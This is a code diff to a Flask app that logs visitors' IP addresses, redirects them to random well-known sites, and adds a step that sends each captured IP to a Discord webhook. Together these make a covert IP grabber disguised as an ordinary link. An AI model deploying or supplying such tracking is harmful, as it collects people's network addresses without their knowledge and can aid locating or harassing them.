@@ -1,10 +1,14 @@
 from flask import Flask, redirect, request, render_template_string
 import random
 from datetime import datetime
+import requests  # <-- add this
 
 app = Flask(__name__)
 
-# List of random redirect links
+# Discord webhook URL
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_here"  # <-- paste yours here
+
+# Links to redirect to
 links = [
     "https://www.google.com",
     "https://www.wikipedia.org",
@@ -13,10 +17,10 @@ links = [
     "https://www.youtube.com"
 ]
 
-# Store logs in memory (or extend to a database later)
+# Store logs in memory
 visit_log = []
 
-# HTML page for homepage
+# HTML for homepage
 html_template = """
 <!DOCTYPE html>
 <html>
@@ -39,8 +43,17 @@ def visit():
     log_entry = f"{timestamp} - IP: {visitor_ip}"
     visit_log.append(log_entry)
     print(log_entry)
+
+    # Send to Discord
+    message = f"🚶 Visitor from IP `{visitor_ip}` at `{timestamp}`"
+    try:
+        requests.post(DISCORD_WEBHOOK_URL, json={"content": message})
+    except Exception as e:
+        print("Failed to send to Discord:", e)
+
     return redirect(random.choice(links))
 
 @app.route("/logs")
 def logs():
     return "<br>".join(visit_log) if visit_log else "No visits yet."
+
